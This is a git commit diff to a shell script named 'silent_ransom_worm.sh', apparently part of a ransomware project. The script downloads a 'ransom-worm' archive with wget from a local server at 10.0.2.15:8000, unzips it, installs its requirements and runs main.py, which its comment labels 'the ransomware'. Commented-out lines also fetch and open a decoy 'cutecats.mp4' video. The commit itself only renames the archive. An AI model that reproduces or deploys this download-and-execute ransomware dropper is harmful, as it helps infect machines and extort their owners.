4eb08896e4e9adf652165b037ef473ace1de7f06
Dinones <leixpinyon6@gmail.com>
2023-12-10 16:48:29 +0100

    Solved minibug

--- server/silent_ransom_worm.sh
+++ server/silent_ransom_worm.sh
@@ -6,8 +6,8 @@ mkdir ransom-worm; cd ransom-worm; # Creates the ransomware folder
 # /usr/bin/wget -O cutecats.mp4 '10.0.2.15:8000/send_video'; # Downloads the video
 # /usr/bin/xdg-open cutecats.mp4; # Opens the video 
 
-/usr/bin/wget -O ransom-worm.zip '10.0.2.15:8000/send_ransomworm'; # Downloads the worm
-/usr/bin/unzip ransom-worm.zip; # Unzips the worm
+/usr/bin/wget -O ransom_worm.zip '10.0.2.15:8000/send_ransomworm'; # Downloads the worm
+/usr/bin/unzip ransom_worm.zip; # Unzips the worm
 python3 -m pip install -r requirements.txt; # Installs the requirements.txt
 python3 main.py; # Runs the ransomware
 
